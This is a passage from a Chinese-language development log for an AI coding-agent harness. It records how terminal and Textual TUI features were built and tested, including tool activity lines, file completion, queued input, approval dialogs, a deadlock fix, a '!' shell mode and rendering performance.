- 二次确认 Ctrl-C 改变了退出语义：脚本/管道不走这条分支，非交互仍是 EOF 退出。

**测试**：新增 `tests/test_tool_activity.py`、`tests/test_turn_progress.py`；扩展
`tests/test_cli_output.py`（TTY 活动行、非 TTY 静默、启动头、两次 Ctrl-C）。总回归
1058 passed / 1 skipped。

**收获**：

- 终端 UX 的关键不是花哨，而是「始终知道它在干什么」：进度行 + 工具行就解决了
  90% 的不确定感。
- 任何写同一行的并发输出都需要一个所有者；锁 + 清行必须成对，且只在真正拥有该行时清。
## 工具行与提示符的继续打磨

**问题**：上一轮的活动行只有工具名、参数与耗时，看不出「产出多少」；提示符始终是 `> `，
切过工作区或档位后没有任何视觉锚点；回合末的 tokens 行也没有总用时。

**做法**：

- `tool_activity.result_hint()`：多行输出报 `→ 42 行`，空输出报 `→ 空`，`No output` 报
  `→ 无输出`；单行输出不预览内容，避免把命令输出里的敏感文本刷到终端。
- 活动行在 TTY 下带上 `→ N 行`；失败/拒绝时不加 hint（错误信息本身已足够）。
- 提示符改为 `工作区名 [档位] >`（`ro` / `rw` / `!!`），每轮现读 `load_policy()` 与
  `get_workdir()`，`/cd`、`/sandbox` 后立即生效。
- `[tokens]` 行在累计值后补 `· 用时 mm:ss`，与进度行使用同一个 `format_duration`。

**踩过的坑**：

- `Request` 式的「多行只报行数」是有意取舍：终端里预览工具输出会绕过统一的事件流与
  敏感文件过滤，体量提示足够回答「它有没有干活」。
- 提示符必须每轮求值，不能在 REPL 启动时算一次；否则 `/cd` 与 `/sandbox` 之后提示符
  会说谎。
- 时序测试（tokens 行）原来断言整串文本，新增字段直接失败；改为分段断言
  `本轮/累计`、`用时`、`缓存命中`，减少对行格式的耦合。

**测试**：`tests/test_tool_activity.py` 补 hint 用例，`tests/test_cli_output.py` 补提示符
用例，更新 `test_session_fork_search.py` 的 tokens 断言；总回归 1061 passed / 1 skipped。

**收获**：

- 终端信息设计的优先级：状态 > 体量 > 内容。内容交还给事件流与工具结果，终端只负责
  「它在干什么、干了多少」。
- 提示符是最便宜的状态显示器：一个字符就能避免「在错误的工作区执行」。
## `@` 文件补全

**问题**：让 Agent 看某个文件时，用户得手打完整相对路径；Codex / Pi 都支持输入 `@`
直接补全文件名，这是最常用的输入快捷方式之一。

**做法**：

- 新增 `src/file_mentions.py`：`workspace_files()` 建索引（跳过隐藏项、
  `node_modules`/`.git`/`.cache` 等，最多 8000 个），`match_mentions()` 先匹配文件名
  前缀、再匹配路径包含，`mention_token()` 解析光标前的 `@token`，`format_mention()`
  负责含空格路径的引号。
- `SlashCompleter` 在非 `/` 输入里识别 `@` 提及并按工作区缓存索引（5s 或换工作区后重扫），
  避免每次按键遍历目录。
- 补全插入的是纯文本路径，不附加文件内容：内容读取仍走 `read` 工具，权限、编码、
  截断与敏感文件过滤保持一致。

**踩过的坑**：

- 提及识别必须看 `@` 前一个字符：`a@b` 是邮箱、`(@x` 是括号里的路径。只按 `@`
  切分会把邮箱也弹出文件列表。
- 每次按键都 `os.walk` 在大仓库会明显卡顿；按工作区 + 5s TTL 缓存，并在切换工作区时
  立即失效。
- 不在补全里预览文件内容：那会绕过统一的事件流与敏感文件过滤，也会把大文件塞进终端。

**测试**：新增 `tests/test_file_mentions.py`（索引过滤、匹配顺序、边界、引号），
`tests/test_cli_input.py` 补 `@` 补全与邮箱反例；总回归 1067 passed / 1 skipped。

**收获**：

- 输入快捷方式的价值在于「不打断思路」；补全只给路径、不给内容，才能复用既有的读取规则。
- 任何逐键触发的目录扫描都要有缓存与上限，否则在大仓库上会成为新的卡顿源。
## 提示符显示 git 分支

**问题**：提示符只有工作区与档位；同一工作区切换分支后没有任何视觉差异，容易在错误
分支上执行写操作。但每次输入都启动 `git` 子进程会引入几十毫秒延迟。

**做法**：

- 新增 `src/git_branch.py`：直接读 `.git/HEAD`，`ref: refs/heads/x` 取分支名，分离 HEAD
  取前 8 位哈希；`.git` 是文件时按 `gitdir:` 解析，覆盖 worktree / submodule。
- `prompt_text()` 拼成 `工作区 (分支) [档位] >`；非 git 工作区省略分支段。

**踩过的坑**：

- 不能用 `git branch --show-current`：提示符每次输入前求值，子进程启动延迟会变成可感知
  的输入卡顿；读 HEAD 只有一次小文件读取。
- 相对 `gitdir:` 路径必须相对工作区解析，否则 worktree 在别的盘符时会找不到 HEAD。
- HEAD 缺失/不可读时静默省略分支，不把提示符变成报错输出。

**测试**：新增 `tests/test_git_branch.py`（分支、分离 HEAD、`.git` 文件、相对 gitdir、
缺失 HEAD），`tests/test_cli_output.py` 补带分支的提示符断言；总回归 1073 passed / 1 skipped。

**收获**：

- 提示符状态的每个字段都要有「求值成本预算」：读文件可以，起进程不行。
- 缺失信息时省略而不是报错，是提示符这类高频 UI 的基本要求。
## 回合中排队输入与工具输出折叠

**问题**：回合进行时终端只能看、不能输入；工具输出一长就把终端刷屏，而模型其实只需要
头尾。Codex / Pi 在这两点上都支持「边跑边输入」和「长输出可展开」。

**做法**：

- `src/turn_control.py`：`ACTIVE` / `CANCEL` 两个事件描述「回合进行中」与「请求取消」。
- `cli_input.QueuedPrompt`：TTY 下由后台线程跑 `PromptSession`，主线程从队列取行；
  回合中输入的句子排队，回合结束后按顺序执行；Ctrl-J 换行、历史和补全保持不变。
- `patch_stdout` 包住整个 REPL：回合内的工具行、流式文本与进度行都打印到提示符上方。
- Ctrl-C 在回合中只置取消位（`on_delta` 检查后抛 KeyboardInterrupt），空闲时才作为
  「提示 / 退出」事件；避免取消一次却多出一次退出提示。
- 工具输出超过 8 行折叠成头 4 + 尾 2，存进 `TOOL_OUTPUTS` 环形缓存（最近 20 条），
  工具行末尾给出 `/expand <编号>`；非 TTY 不折叠，输出保持原样。

**踩过的坑**：

- 输入线程一启动就会消费事件：测试必须先进入 `begin_turn()` 再构造 reader，否则 Ctrl-C
  会被当作空闲中断。
- 取消不能用「往队列塞 KeyboardInterrupt」：主线程正在 `agent_loop` 里，队列没人读；
  必须用共享事件，由流式回调在主线程抛异常。
- `patch_stdout` 必须包住整个循环，而不只是 `agent_loop`：命令输出（`/help`、`/status`）
  同样会破坏提示符。
- 折叠不能丢内容：全文进环形缓存并可用 `/expand` 取回；缓存上限 20 条，避免长期会话
  把内存撑大。

**测试**：新增 `tests/test_queued_input.py`（顺序、EOF、空闲 Ctrl-C、回合中 Ctrl-C），
`test_tool_activity.py` 补折叠用例，`test_cli_output.py` 补「折叠后可展开」；
总回归 1079 passed / 1 skipped。

**收获**：

- 输入线程与主循环之间只共享「队列 + 事件」，不要共享终端对象。
- 任何「折叠」都必须给用户取回全文的路径，否则只是丢信息。

## 启动与每轮性能优化

**测量**（本机，Windows）：

- `import harness`：341ms → 252ms。
- 纯文本回合（假 client）：非 git 工作区 241ms → 125ms；git 工作区 266ms → 134ms。

**做法**：

- 删除 harness 中未使用的 `argparse` 与 `web_access` 导入（约 90ms 启动）。
- `exec_policy` / `tool_exec` 把 `web_access` 延迟到真正用到时导入；策略层只在校验
  URL 时才需要 urllib。
- `workspace_diff.repo_root` 改为向上找最近的 `.git` 目录（只缓存肯定结果），
  不再每轮两次 `git rev-parse`；非 git 工作区直接返回 None。
- `checkpoints._git_baseline`：非 git 工作区直接返回空基线，不再每轮起一个注定失败的
  `git status`。
- 工作区基线延迟到**首个工具批次**再取：纯文本回合（没有工具）完全不跑 `git status`，
  也不做回合末改动汇总。

**踩过的坑**：

- 测试用假的 `git rev-parse` 返回仓库根，但目录里没有 `.git`：新的文件系统快路径
  直接判定「非仓库」。测试需要补一个 `.git` 目录；真实场景里 worktree/submodule 的
  `.git` 文件同样能被发现。
- `CheckpointManager` 的单测用 `__new__` 构造、没有 `workspace` 属性：新加的快速
  返回必须 `getattr(self, 'workspace', None)`，否则老测试会 AttributeError。
- 延迟取基线改变了 `/diff` 的语义边界：只有真正执行过工具的回合才统计本轮改动；
  纯问答本来也不会改文件，代价可接受，但要在文档里说清楚。

**收获**：

- 每轮固定开销优先砍「注定失败的子进程」：非 git 目录里的 `git status` 纯粹是浪费。
- 用文件系统判断替代 `git rev-parse` 是几十毫秒级的收益，但必须覆盖 worktree 与
  GIT_DIR 这类边界。
## feature/ui 合并 main（目录重构后）

**背景**：`feature/ui` 基于 `src/` 重构之前的布局（根目录模块、根目录测试），而 main
已经完成模块拆分、无头执行、排队输入、输出折叠与性能优化。两个分支的 24 条 UI 提交
与 main 的 125 条提交没有共同的新基线，文本合并大面积冲突。

**合并处理**：

- 采用 main 的 `src/` 布局：删除根目录的 `MCPclient.py` / `background_task.py` /
  `hooks.py` / `DEBUG_LOG.md` / `test_context_manage.py`（这些内容已在 `src/` 与
  `docs/` 中演进）。
- `harness.py` 取 main 版本；UI 分支独有的 `cc_ui.py` / `renderer.py` /
  `ui_events.py` / `ui_textual.py` / `test_ui.py` / `test_mcp_ui_regression.py` /
  `OPTIMIZATION.md` / `pyproject.toml` 保留。
- `.gitignore` 取 main 版本（包含 `.cache/`、`.test-tmp*/` 等 UI 开发也需要忽略的项）。

**为了分支可运行而补的接线（本轮）**：

- harness 暴露 `permission_gate = ui_events.PermissionGate(bus)`：Textual 渲染层在
  `on_mount` 订阅总线，审批弹窗用它应答；非 UI 模式仍走 stdin。
- `CCApp.__init__` 初始化 `_round_metrics` / `_background_tasks`：早到的事件不再依赖
  `on_mount` 顺序。
- `test_ui.py` 改读 `#status-main`（状态栏已拆分为主状态与上下文两块）。
- `test_mcp_ui_regression.py` 重写为当前契约：session 跑在一条长生命周期任务里，
  `connect()` 保存任务句柄、`close()` 取消并等待；旧的「不要创建子任务」断言对应的是
  已被替换的旧实现。
- 顺带清理 UI 文件的 lint（16 项：import 排序、两处超长行、未使用变量、`os.path`）。

**仍未完成（后续提交）**：

- harness 主循环尚未 emit UI 事件（`assistant_start/delta/end`、`tool_start/end`、
  `status`、`round_end`、`session_end`）：Textual/ANSI 渲染层目前只在测试注入的事件下
  工作，真实会话还看不到流式输出。
- `update_panel_status` 的指标聚合（token/成本/上下文来源）仍只在旧分支实现。
- `ui_textual` 引用的 `export_session` / `list_transcripts` / `load_transcript`
  在新 harness 中不存在（旧分支也缺失），需要按 session_store 重新实现。

**验证**：`pytest tests/` 1079 passed / 1 skipped（main 回归）；`pytest test_ui.py
test_mcp_ui_regression.py` 49 passed；`ruff check` 对根 UI 文件通过。
## feature/ui：把 main 的功能接进 UI 事件桥

**背景**：合并只完成了目录层面的统一；新 harness 不 emit 任何 UI 事件，Textual/ANSI
渲染层拿到的是空流，真实会话里看不到流式输出与工具块。本轮把 main 的流式、工具执行、
用量与转录能力接入 `ui_events`。

**做法**：

- 新增 `src/ui_bridge.py`：事件转发（无订阅者时空操作）、`SessionMetrics`
  （工具次数 / prompt / completion / cached / 最近调用）、`status_payload()`
  （在桥里算 ctx 百分比，渲染层只负责画）。
- `agent_loop`：
  - 有 UI 订阅者时即使调用方没传 `on_delta` 也走流式（`streaming_enabled()`），
    首个 delta 发 `assistant_start`，逐段 `assistant_delta`，收尾 `assistant_end`；
    非流式回复发 `assistant_text`。
  - 每轮模型调用发 `activity(thinking)`，usage 解析后发 `round_end` + `status`
    （ctx 用供应商返回的 prompt_tokens，标 `confirmed`），工具批次后刷新状态。
  - 回合结束发 `session_end`（summary 来自 METRICS）与 `activity(complete)`。
- `exec_tool_call` 发 `tool_start` / `tool_end`（预览 2KB、长度、耗时、outcome、
  后台标记），并累计工具次数；teammate/子代理的工具也会出现在同一条事件流里。
- `run_repl`：`/new` 与会话启动时重置指标并发 `session_start`；提交消息发
  `user_message`；中断与异常分别发 `activity(cancelled)` / `error`。
- `HARNESS_UI=textual` + TTY 时把 REPL 交给 `ui_textual.run(messages)`；textual
  或终端不可用时打印原因回退行式 REPL。
- 新增 `export_session` / `list_transcripts` / `load_transcript`（复用
  `agent_core.write_transcript`），补齐 `ui_textual` 的命令面板调用。
- UI 侧：回合结束摘要改称 “Turn complete”；价格来源为 `unavailable` 时不再显示
  `¥0.0000`；`session_end` 仍用于每回合收尾（main 的 `agent_loop` 一次处理一条用户消息）。

**取舍**：

- 不做成本估算：main 没有可靠价格表，显示 `~¥0.0000` 等于谎报；宁可不显示。
  后续要显示成本，需要先确定价格来源与币种。
- 状态行的 ctx 百分比用「真实窗口」而不是压缩阈值 `CONTEXT_LIMIT`：否则 80%
  安全线会被画成 100%。
- 只在有订阅者时开流式：SDK/无头/测试保持非流式行为，避免额外协议字段。

**测试**：新增 `tests/test_ui_bridge.py`（流式/状态/回合事件、工具事件、
transcript 往返）；`pytest tests/` 1082 passed / 1 skipped；
根目录 UI 测试 47 + MCP UI 回归 2 条通过。

**仍需后续处理**：

- 成本显示与价格表（需要产品决策）；
- ANSI 渲染后端（`renderer.py`）尚未接到新 REPL 的 print 路径：目前默认仍是行式
  输出，Textual 走事件流；两条渲染路径没有统一；
- teammate/后台任务的工具事件会混入主会话事件流，需要按 session/agent 标记区分。
## feature/ui：事件归属与行式 REPL 的统一

**背景**：上一轮把事件接进总线后还有两个问题：ANSI 模式下渲染器没接（事件只在
Textual 可见），以及 teammate 的工具事件会混进主会话聊天区。

**做法**：

- **事件归属**：`ui_bridge.emit` 自动补 `session_id` / `agent`；主循环设
  `lead` + 当前会话，teammate 线程设 `teammate:<name>` + 它继承的会话 id，
  子代理的工具调用用 `agent_context('subagent')` 包住。
  `CCApp` 只消费当前会话的事件（未打标的旧事件/测试事件仍然可见）。
- **行式 REPL 接入总线的正确姿势**：新增 `renderer.ReplRenderer`，订阅同一个
  bus，但把 REPL 自己已经打印的通道（流式文本、工具行、status、回合收尾）让出去，
  只渲染 `error`/`diff`/`background`/`permission` 这些 REPL 没覆盖的事件。
  `_attach_repl_renderer()` 只在 TTY 下 attach 一次，测试/管道保持纯文本。
- **ANSI 的状态可见性**：回合末 `[tokens]` 行补 `ctx N%`（用真实窗口而不是压缩阈值），
  行式界面不必为状态栏再引一套渲染。

**取舍**：

- 不把 `AnsiRenderer` 直接接进行式 REPL：它会把流式文本与工具行再打印一遍；
  与其在两个渲染器之间做去重，不如明确「REPL 负责哪些通道」。
- 子代理目前不走 `exec_tool_call`（自己调 handler），因此它的工具不会出现在
  UI 事件流里；要显示需要先把子代理改用统一执行路径，属于后续改动。
- teammate 的 `assistant_*` 事件没有单独发：teammate 的最终汇报通过 BUS 回到
  lead，聊天区只显示主会话，符合预期。

**测试**：`tests/test_ui_bridge.py` 补事件归属、Textual 会话过滤、
`ReplRenderer` 通道过滤；`pytest tests/` 1085 passed / 1 skipped；
根 UI 测试 49 passed，`ruff` 通过。
## 子代理改用统一执行路径

**问题**：子代理自己解析参数、调 `PreToolUse`、直接执行 handler、再 `PostToolUse`，
等于维护了第三条工具执行路径（主循环 / teammate / 子代理）。后果是子代理的工具输出
**不做入口截断**（30KB 输出原样进上下文），也没有 UI 事件、checkpoint 捕获与统一的
异常兜底。

**做法**：

- `spawn_subagent` 的工具轮改为调用 `harness.exec_tool_call(..., hooks=True,
  background=False)`：审批、`_bound_tool_output` 截断、图像结果、异常兜底、UI 事件
  全部复用主循环那一份。
- 用 `ui_bridge.agent_context('subagent')` 包住每次调用：子代理的工具块在 Textual
  里可见，但 `agent` 字段标成 subagent，便于渲染层区分。
- 图片附件仍排在整批 tool 结果之后（与主循环相同的消息布局约束）。

**取舍**：

- `background=False`：子代理本身是同步调用，再嵌套后台任务只会让结果更难收集。
- `hooks=True`：子代理仍在主线程同步执行，审批可以和主循环一样走交互/无头门；
  teammate 才是 `hooks=False`。

**测试**：新增 `tests/test_subagent_loop.py`（统一路径与消息布局、事件归属、
入口截断生效）；`pytest tests/` 1087 passed / 1 skipped。
## Textual 模式的审批接线

**问题**：`ui_textual` 把 `harness.permission_gate.use_ui` 置 True，但真正拦截工具的
是 `hooks.GATE`。后者在 console 后端里 `input()`：Textual 已接管终端，读不到输入，
打印的审批提示还会刷坏全屏界面——TUI 下的审批实际上是坏的。

**做法**：

- `hooks._ui_mode()`：以 `harness.permission_gate.use_ui` 为准判断渲染层是否接管终端。
- `decide()`：UI 模式把请求交给 `permission_gate.request(tool, args, title=reason)`，
  由渲染层弹窗应答；`resolve()` 记入审批历史，`_conclude(quiet=True)` 不再打印。
- `decide_queued()`（teammate / 后台 worker）：同样走弹窗，工作线程阻塞等 UI 决议；
  没有 UI 时保持原来的「排队等远程/超时拒绝」。
- `_conclude(quiet=...)`：UI 模式不打印状态行，结果交给弹窗与事件流。

**取舍**：

- 弹窗超时沿用 `ui_events.PermissionGate` 的 300s；`hooks.GATE.timeout` 仍只作用于
  远程后端，两套超时语义没有合并（合并会让 CLI 与 TUI 行为不一致）。
- teammate 的并发审批会同时弹多个窗口，目前按请求顺序排队由用户逐个处理；
  批量授权仍走「同类」或远程审批接口。

**测试**：`tests/test_permission_gate.py` 新增两条：UI 模式走弹窗且不读 stdin、
不向控制台打印；弹窗拒绝时正确返回 denied。总回归 1089 passed / 1 skipped。
## UI 端到端回归：真实 agent_loop → Textual

**问题**：此前的 UI 测试都是「注入事件」或「monkeypatch agent_loop」，只验证了渲染层；
真正把 main 的流式、工具执行、事件桥与 TUI 串起来的链路没有测试。第一次跑端到端就
暴露了一个真实缺陷：Textual 占用终端时，行式工具活动行仍尝试用 GBK 控制台打印 `•`，
`UnicodeEncodeError` 直接把回合打断，TUI 里显示成一段错误文本。

**做法**：

- `_print_tool_activity`：Textual 模式（`permission_gate.use_ui`）直接不打印，
  工具块交给事件流；非 TUI 下遇到 `UnicodeEncodeError` 用当前编码替换后重试，
  展示问题不再打断回合。
- 新增 `tests/test_ui_integration.py`：只替换模型调用（`_stream_completion`），
  审批、工具执行、事件桥、会话存储与 Textual 渲染全走真实路径：
  1. 流式两段文本 → TUI 最终 Markdown 含完整回答；
  2. 工具轮（read）→ TUI 中出现工具块与结果，随后正常收尾。

**取舍**：端到端测试用 120 次短轮询等待渲染，避免固定 sleep 造成的慢与抖动；
它依赖 textual，缺包时 skip。

**测试**：`pytest tests/` 1091 passed / 1 skipped；根 UI 测试 49 passed；`ruff` 通过。
## 启动「卡住」的根因：agent_lock 死锁

**现象**：`python harness.py`（`.env` 里 `HARNESS_UI=textual`）启动后停在 TUI，
输入消息后一直显示「正在处理当前消息…」，进程不退出、CPU 空闲。

**定位**（`py-spy dump --pid`）：

```
MainThread  → textual.app.run → ui_textual.run → harness.run_repl
asyncio_0   → ui_textual._run_agent → with harness.agent_lock   ← 阻塞
```

根因是合并后两套加锁职责重叠：

- `entrypoint.main` 在行式 REPL 外层 `with harness.agent_lock:` 全程持锁，
  目的是不让 cron 队列在用户对话间插话；
- Textual 分支的 `_run_agent` 也在每个回合 `with harness.agent_lock:`。
- `agent_lock` 是 `threading.Lock`（非重入），且持有者与等待者不是同一线程
  （Textual 事件循环在主线程，agent 跑在 worker 线程）→ 永久等待。

UI 测试直接构造 `CCApp`（绕过 entrypoint），所以没有覆盖到这条路径。

**修复**：

- `entrypoint._interactive_lock()`：`HARNESS_UI=textual` 时返回 `nullcontext`，
  锁交给 UI 的 agent worker 按回合持有（空闲释放，cron 才有机会运行）；
  行式 REPL 保持全程持锁的原行为。
- 兜底一：新增 `--ui ansi|textual`，显式参数覆盖 `.env`，TUI 卡住时
  `python harness.py --ui ansi` 直接救场。
- 兜底二：`ui_textual.run` 抛异常（终端/驱动不兼容）时回退行式 REPL 并打印原因，
  不再带着异常退出。

**测试**：`_interactive_lock` 在两种 UI 下的行为、`--ui` 覆盖 `.env`、
Textual 启动失败回退行式 REPL。总回归 1094 passed / 1 skipped，UI 测试 49 passed。

**教训**：跨分支合并时，「锁由谁持有」和「锁在哪一层加」必须重新核对一遍；
直接构造 UI 组件的测试覆盖不到入口层的锁顺序，端到端要至少有一条经过 `main()`。
## TUI 的 `/` 命令提示

**问题**：行式 REPL 输入 `/` 会弹出补全菜单，但 Textual TUI 的输入框把 `/help`
当成普通聊天发给模型——既没有提示，也没有命令路由。合并后默认 UI 是 textual，
用户体感就是「`/` 的提示不见了」。

**做法**：

- `on_input_submitted`：以 `/` 开头的文本不再进入对话队列，交给 `_execute_command`。
- 输入框下方新增 `#command-hint`：`on_input_changed` 时按 `cli_commands.COMMANDS`
  过滤出「TUI 支持」的命令（help/status/model/pwd/quit/clear/export/sessions/
  resume/allow/search/failures/all…），只列这些，避免提示里出现点了没反应的死路。
- `_execute_command` 补齐 `quit/exit`、`status/model/pwd`；`/diff`、`/review`、
  `/cache` 等仅行式命令给出明确提示「用 `python harness.py --ui ansi`」。
- 底部栏高度从 2 调到 3，提示行与状态行分开；输入框 placeholder 增加「/ 命令 ·
  Ctrl+P 面板」。

**取舍**：

- 没有实现逐键过滤的下拉补全（Textual Input 不内建）：先用单行提示 + 过滤列出，
  Enter 直接执行；这比假装有下拉但键盘不可选更可靠。
- 命令提示只列 TUI 真能执行的命令；完整命令表仍由 `Ctrl+P` 面板与 `/help` 提供。

**测试**：`test_ui.py` 新增 `/` 解析与提示文本用例、`run_test` 下
「输入 `/he` 出现提示、提交 `/help` 不进入对话队列」；总回归 1094 passed /
1 skipped，UI 测试 49 passed。
## TUI 与行式 REPL 的行为对齐

**问题**：main 上的「回合中排队输入、`@` 文件补全、输入历史、提示符状态」都只做在
行式 REPL；Textual TUI 仍然是「忙时禁用输入、没有 @ 提示、没有历史、状态栏缺分支/档位」。
用户体感就是之前的功能没有接进 UI。

**做法**：

- 排队：`on_input_submitted` 不再因 `_busy` 丢弃输入；消息进 `_user_input_q`，
  worker 按顺序处理。`_set_input_busy` 不再禁用输入框，占位符显示
  `正在处理当前消息…（已排队 N 条）`，状态行追加 `N queued`。
- `@` 文件补全：输入框下方提示行在非 `/` 输入时改用 `file_mentions` 匹配；
  `Tab` 由 `PromptInput` 绑定到 `complete_input()`（`/` 补命令名，`@` 补路径）；
  文件索引按工作区缓存 5s。
- 输入历史：`↑`/`↓` 绑定 `history_prev` / `history_next`，提交时记录（命令不入历史）。
- 状态栏：`status` 事件补 `branch` 与 `sandbox`；`_pills` 在宽度允许时显示
  `⎇ main` 与档位胶囊，和行式提示符的信息一致。

**取舍**：

- 仍是单行输入（Textual `Input`），没有做多行编辑；多行需要换 `TextArea` 并重做
  提交键位，属于下一步。
- `Tab` 只在有提示时改值，不抢占焦点切换；没有提示时行为不变。
- 排队消息立即渲染在聊天区（与 Codex 一致），实际执行顺序由 worker 队列保证。

**测试**：`test_ui.py` 新增 `@` 提示/补全、排队输入（不禁用、占位符与 `queued`
状态）、历史前后翻阅；`tests/test_ui_bridge.py` 断言 `status` 事件带 branch/sandbox。
总回归 1095 passed / 1 skipped，UI 测试 52 passed。
## TUI 的 Esc 取消

**问题**：TUI 只有 `Ctrl+C` 退出，没有「取消当前回合」的快捷方式；行式 REPL 的
`Ctrl-C` 取消依赖 `on_delta` 包装，而 TUI 走的是事件流路径，取消信号此前没有
进入主循环。

**做法**：

- `agent_loop` 每轮开头与流式 `_delta_hook` 检查 `turn_control.cancel_requested()`，
  命中就抛 `KeyboardInterrupt`（与行式 REPL 同一条收敛路径）。
- `ui_textual`：`Esc`（`action_jump_bottom`）在 `_busy` 时改为请求取消，空闲时
  保持「回到最新消息」；`action_quit` 也改用同一个取消源。
- `_run_agent` 用 `turn_control.begin_turn()` / `end_turn()` 包裹每个回合，
  并显式捕获 `KeyboardInterrupt` → 发 `activity(cancelled)`，不再按失败处理。
- 取消后 `end_turn()` 清空取消位，下一条排队消息不会继承上一次的取消状态。

**已知边界**：

- 取消在「下一次模型增量 / 下一轮开头」生效；正在阻塞的 HTTP 请求不会被强杀，
  这点与行式 REPL 一致。
- 工具执行中途取消会在工具返回后生效，不会中断子进程。

**测试**：`tests/test_ui_bridge.py` 断言取消位让 `agent_loop` 抛 `KeyboardInterrupt`；
`test_ui.py` 断言 Esc 在忙碌时只请求取消、不改输入内容。总回归 1096 passed /
1 skipped，UI 测试 55 passed。
## TUI 的会话切换改回真实会话

**问题**：`ui_textual` 的 `/sessions` 和 `/resume` 用的是 `list_transcripts` /
`load_transcript`——那是导出的 JSONL 快照，不是 `SessionEventStore` 的事件流。
表现是：列表里的编号与行式 `/resume` 对不上，恢复后也没有工作区、会话 id 与
后续事件连续性。

**做法**：

- `/sessions` 改用 `harness.session_rows()`（与行式 REPL 同源），显示标题、工作区、
  最近活跃与 id 前缀。
- `/resume <n | ID前缀 | 标题>`：按序号或匹配解析；`SessionEventStore.open` +
  `rebuild_openai_history(recover_pending=True)` 恢复历史；有工作区则
  `harness.set_workspace`；同步 `self._session_id`（事件过滤用）；重绘历史消息。
- 多个匹配时要求用序号，避免误恢复；找不到时给出明确提示。
- transcript 导出仍走 `/export`，职责分开。

**取舍**：恢复后旧会话的待审批请求不会自动重放（与行式 `/resume` 一致），
需要重新执行；跨会话搜索仍走行式 `/find`。

**测试**：`test_ui.py` 新增真实会话的列目录 + 按序号恢复（tmp 会话、
断言 session_id 与消息历史切回）；总回归 1096 passed / 1 skipped，
UI 测试 56 passed。
## TUI 多行输入

**问题**：Textual 的 `Input` 是单行控件，贴一段代码或写多段需求时无法换行；
行式 REPL 至少还能 `Ctrl-J` 换行。Codex/Pi 的输入区都可以多行编辑。

**做法**：

- 底部输入从 `Input` 换成 `TextArea`（`PromptArea`）：
  `Enter` 发送、`Ctrl-J` 换行；`Tab` 仍补全 `/` 命令或 `@` 文件；`↑/↓` 在单行时翻历史，
  多行时保持光标上下移动。
- 高度随内容增长，CSS `max-height: 8`；粘贴多行内容不再被截成一行。
- 提交逻辑从 `Input.Submitted` 事件改为 `PromptArea.action_submit → app.submit_text(text)`，
  测试可以直接调用 `submit_text` 而不依赖控件事件。
- 忙碌提示从 `placeholder` 改到输入框下方的提示行（`TextArea` 没有 placeholder）：
  `正在处理当前消息…（已排队 N 条）`，空闲时显示
  `Enter 发送 · Ctrl-J 换行 · / 命令 · @ 文件 · ↑↓ 历史 · Ctrl+P 面板`。

**取舍**：

- `Shift+Enter` 在部分终端与 `Enter` 不可区分，换行统一用 `Ctrl-J`（与行式 REPL 一致）。
- `Tab` 仍只补全、不切焦点；多行内容的光标移动交给 `↑/↓/←/→` 原生命令。

**测试**：`test_ui.py` 用 `run_test` 模拟输入 `abc` + `Ctrl-J` + `def` + `Enter`，
断言输入框保留换行、提交后进入历史且输入清空；其余输入相关测试改用 `.text` /
`submit_text`。总回归 1096 passed / 1 skipped，UI 测试 57 passed。
## `!` shell 模式

**问题**：想跑一条命令时，要么让模型调 `bash`（多一轮请求、输出进上下文），
要么切到另一个终端。Codex/Pi 都支持 `!cmd` 直接执行。

**做法**：

- TUI：`submit_text` 识别 `!cmd`，在 Textual worker 线程里调 `harness.run_bash`；
  执行期间把 `permission_gate.use_ui` 置 True、`turn_control` 包住回合，让审批弹窗、
  超时与取消语义与 agent 回合一致。结果通过 `ui_bridge.emit('tool_start'/'tool_end')`
  渲染成普通工具块（可折叠、带耗时），输出不进入模型上下文。
- 行式 REPL：`run_repl` 在解析命令前识别 `!cmd`，直接 `print(run_bash(cmd))`；
  不写入会话消息，`continue` 回到提示符。
- 两者都保留策略层的审批/沙箱/超时：`!` 只是省掉一次模型调用，不是绕过执行边界。

**取舍**：

- TUI 在回合进行中暂不允许 `!`（避免两个回合同时抢审批与输出块），提示先等结束或 Esc 取消。
- `!` 输出只展示，不进入上下文；需要模型看到结果就正常提问让模型执行。
- 行式 REPL 的 `!` 输出不做折叠（终端原生滚动），TUI 复用已有的 Collapsible 工具块。

**测试**：`test_ui.py` 断言 `!echo hi` 不进模型队列、聊天区出现输出、历史记录；
`tests/test_cli_output.py` 断言行式 `!` 直接执行且 `agent_loop` 不被调用。
总回归 1097 passed / 1 skipped，UI 测试 58 passed。
## TUI 候选列表与只读快捷键

**问题**：`/`、`@` 之前的实现只有一行文字提示 + Tab 补第一个；Codex/Pi 是逐键
候选列表，可以上下选。另缺一个「临时切只读」的快捷键。

**做法**：

- 新增 `completion_items(text, files)`：`/` 返回 TUI 支持的命令名+描述，`@` 返回
  文件路径；`_update_command_hint` 把它渲染成带 `▸` 标记的多行列表（最多 6 行）。
- `PromptArea` 绑定：`Tab` 采用当前候选（命令名或替换 `@token`），
  `Alt+↑` / `Alt+↓` 循环选择；`accept_suggestion` 处理 `/` 与 `@` 两种替换位置。
- `Ctrl+R`：在读档位 `read-only` 与 `workspace-write` 之间切换，调用
  `harness.apply_sandbox_tier`（与 `/sandbox` 同一条策略层路径），状态栏的档位胶囊
  与提示同时更新。
- 提示行 CSS 从固定 1 行改为 `height: auto; max-height: 7`，候选多时不挤压聊天区。

**取舍**：

- 仍是「提示行内的列表」而不是悬浮 overlay：Textual 的 Float 需要额外的焦点管理，
  当前方案在窄终端也不会盖住消息，Tab/Alt 键路径足够完成选择。
- `Alt+↑/↓` 而非 `↑/↓`：后者在多行输入里必须保留光标移动。
- `Ctrl+R` 只切换两个档位；`danger-full-access` 仍需 `/sandbox danger-full-access`，
  避免误触高风险档位。

**测试**：`completion_items` 的命令/文件两类数据；run_test 下 Tab 采用、Alt 切换、
`@` 替换位置；`Ctrl+R` 调用档位切换并更新状态。总回归 1097 passed / 1 skipped，
UI 测试 61 passed。
## TUI 大历史渲染性能

**测量**（2000 条历史消息、每条约 250 字符）：

| 方案 | 耗时 |
|---|---|
| 逐条 `await mount`（原实现） | 66.5 s |
| `mount_all` 一次性 2000 个 Static | 1.8 s |
| 分批 `mount_all`（200/批） | 2.3 s |
| 分批 + 历史 Markdown 换 Static | 分块 Markdown 2000 条仍需 9.8 s |
| 现在：最近 400 条 + 分批 + 老消息 Static | **0.46 s** |

**根因**：Textual 的 `mount` 是异步的，逐条 `await` 会每条都触发一次布局/刷新，
复杂度接近 O(n²)；历史 assistant 消息用 `Markdown` 每次都要重新解析，代价更高。

**做法**：

- `_render_history(messages)`：只取最近 `HISTORY_RENDER_LIMIT=400` 条，更早的折叠为
